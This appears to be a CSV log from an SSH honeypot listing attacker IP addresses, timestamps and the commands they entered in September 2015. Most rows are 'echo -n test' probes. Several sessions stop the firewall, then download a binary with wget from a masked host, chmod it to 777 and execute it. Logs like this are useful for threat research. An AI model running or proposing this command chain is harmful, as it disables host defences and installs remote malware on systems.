ip,timestamp,input
"36.22.5.113","2015-09-13 19:50:50","echo -n test"
"36.22.5.113","2015-09-13 19:53:54","echo -n test"
"212.69.7.32","2015-09-13 21:18:52","echo -n test"
"212.69.7.32","2015-09-13 21:22:53","echo -n test"
"110.44.113.16","2015-09-14 01:20:39","echo -n test"
"110.44.113.16","2015-09-14 01:24:18","echo -n test"
"200.185.211.192","2015-09-14 01:31:15","echo -n test"
"200.185.211.192","2015-09-14 01:34:47","echo -n test"
"196.1.126.59","2015-09-14 11:46:09","echo -n test"
"196.1.126.59","2015-09-14 11:48:32","echo -n test"
"14.153.95.30","2015-09-14 14:55:44","echo -n test"
"14.153.95.30","2015-09-14 14:59:17","echo -n test"
"222.186.30.14","2015-09-14 17:32:37","/etc/init.d/iptables stop"
"222.186.30.14","2015-09-14 17:32:37","service iptables stop"
"222.186.30.14","2015-09-14 17:32:37","SuSEfirewall2 stop"
"222.186.30.14","2015-09-14 17:32:37","reSuSEfirewall2 stop"
"222.186.30.14","2015-09-14 17:32:37","wget -c http://***.***.***.***/10000"
"222.186.30.14","2015-09-14 17:32:37","chmod 777 10000"
"222.186.30.14","2015-09-14 17:32:37","./10000"
"222.186.30.14","2015-09-14 17:32:53","/etc/init.d/iptables stop"
"222.186.30.14","2015-09-14 17:32:53","service iptables stop"
"222.186.30.14","2015-09-14 17:32:53","SuSEfirewall2 stop"
"222.186.30.14","2015-09-14 17:32:53","reSuSEfirewall2 stop"
"222.186.30.14","2015-09-14 17:32:53","wget -c http://***.***.***.***/10000"
"222.186.30.14","2015-09-14 17:32:53","chmod 777 10000"
"222.186.30.14","2015-09-14 17:32:53","./10000"
"43.251.87.190","2015-09-15 04:24:48","echo -n test"
"43.251.87.190","2015-09-15 04:27:57","echo -n test"
"125.227.192.66","2015-09-15 15:08:27","echo -n test"
"125.227.192.66","2015-09-15 15:09:16","echo -n test"
"121.197.0.168","2015-09-16 13:41:57","/etc/init.d/iptables stop"
"121.197.0.168","2015-09-16 13:41:57","service iptables stop"
"121.197.0.168","2015-09-16 13:41:57","SuSEfirewall2 stop"
"121.197.0.168","2015-09-16 13:41:57","reSuSEfirewall2 stop"
"121.197.0.168","2015-09-16 13:41:57","wget -c http://***.***.***.***/l"
"121.197.0.168","2015-09-16 13:41:58","chmod 777 l"
"121.197.0.168","2015-09-16 13:41:58","./l"
"61.183.19.52","2015-09-16 14:15:08","/etc/init.d/iptables stop"
